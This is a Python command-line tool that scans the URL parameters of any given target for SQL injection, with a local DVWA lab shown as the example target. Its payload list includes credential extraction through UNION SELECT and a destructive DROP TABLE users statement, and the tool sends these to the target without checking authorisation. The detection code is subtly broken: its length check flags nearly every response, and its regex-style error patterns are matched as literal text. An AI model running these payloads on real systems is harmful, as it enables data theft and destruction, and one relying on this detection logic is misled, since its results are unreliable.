import requests
from urllib.parse import urlencode, urlparse, parse_qs
import time
import sys

class SQLiScanner:
    def __init__(self, target_url, delay=1):
        self.target_url = target_url
        self.delay = delay  # rate limiting in seconds
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SQLi-Scanner-Ethical-Tool/1.0'
        })
    
    # Common SQL injection payloads
    def get_payloads(self):
        return [
            "'",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "\" OR \"1\"=\"1",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' UNION SELECT NULL--",
            "' UNION SELECT username, password FROM users--",
            "'; DROP TABLE users; --",
            "' WAITFOR DELAY '00:00:05'--",
        ]
    
    def test_parameter(self, url, param_name, original_value):
        """Test a single parameter with all payloads"""
        vulnerabilities_found = []
        
        for payload in self.get_payloads():
            # Rate limiting
            time.sleep(self.delay)
            
            # Build test URL
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param_name] = [payload]
            new_query = urlencode(params, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()
            
            try:
                print(f"[*] Testing: {param_name} = {payload[:30]}...")
                response = self.session.get(test_url, timeout=10)
                
                # Detection logic
                if self.is_vulnerable(response, payload):
                    vulnerabilities_found.append({
                        'parameter': param_name,
                        'payload': payload,
                        'response_length': len(response.text),
                        'status_code': response.status_code
                    })
                    print(f"[!] POTENTIAL VULNERABILITY in {param_name} with payload: {payload}")
                    
            except requests.exceptions.RequestException as e:
                print(f"[!] Error testing {param_name}: {e}")
        
        return vulnerabilities_found
    
    def is_vulnerable(self, response, payload):
        """Check if response indicates SQL injection vulnerability"""
        # Common SQL error messages
        sql_errors = [
            "SQL syntax",
            "mysql_fetch",
            "ORA-[0-9]{5}",
            "PostgreSQL",
            "SQLite",
            "Microsoft.*ODBC",
            "Microsoft.*OLE DB",
            "Incorrect syntax near",
            "Unclosed quotation mark",
            "You have an error in your SQL syntax",
            "Division by zero",
            "Unknown column",
            "Warning: mysql",
        ]
        
        response_text = response.text.lower()
        
        for error in sql_errors:
            if error.lower() in response_text:
                return True
        
        # Check for response length difference (boolean-based detection)
        if len(response_text) != response_text.count(payload):
            return True
            
        return False
    
    def scan(self):
        """Main scanning function"""
        print(f"\n{'='*50}")
        print(f"🔍 SQL Injection Scanner")
        print(f"📡 Target: {self.target_url}")
        print(f"{'='*50}\n")
        
        # Parse URL parameters
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        if not params:
            print("[!] No URL parameters found to test!")
            print("[*] Try: python sql_scanner.py 'http://target.com/page?id=1'")
            return
        
        print(f"[+] Found {len(params)} parameter(s) to test: {list(params.keys())}\n")
        
        # Test each parameter
        for param_name in params.keys():
            original_value = params[param_name][0]
            vulns = self.test_parameter(self.target_url, param_name, original_value)
            self.vulnerabilities.extend(vulns)
        
        # Generate report
        self.generate_report()
    
    def generate_report(self):
        """Create scan report"""
        print(f"\n{'='*50}")
        print("📋 SCAN REPORT")
        print(f"{'='*50}")
        
        if self.vulnerabilities:
            print(f"[!] Found {len(self.vulnerabilities)} potential vulnerabilities:\n")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{i}. Parameter: {vuln['parameter']}")
                print(f"   Payload: {vuln['payload']}")
                print(f"   Status: {vuln['status_code']}")
                print(f"   Response Size: {vuln['response_length']} bytes\n")
        else:
            print("[✓] No SQL injection vulnerabilities detected!")
        
        # Save to log file
        with open("scan_report.txt", "w") as f:
            f.write(f"SQLi Scan Report\n")
            f.write(f"Target: {self.target_url}\n")
            f.write(f"Time: {time.ctime()}\n")
            f.write(f"{'='*50}\n")
            if self.vulnerabilities:
                f.write(f"Vulnerabilities Found: {len(self.vulnerabilities)}\n\n")
                for vuln in self.vulnerabilities:
                    f.write(f"Parameter: {vuln['parameter']}\n")
                    f.write(f"Payload: {vuln['payload']}\n")
                    f.write(f"-"*30 + "\n")
            else:
                f.write("No vulnerabilities found.\n")
        
        print(f"[✓] Report saved to: scan_report.txt")

# Main execution
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python sql_scanner.py <target_url>")
        print("Example: python sql_scanner.py 'http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'")
        sys.exit(1)
    
    target = sys.argv[1]
    scanner = SQLiScanner(target, delay=1)  # 1 second delay for rate limiting
    scanner.scan()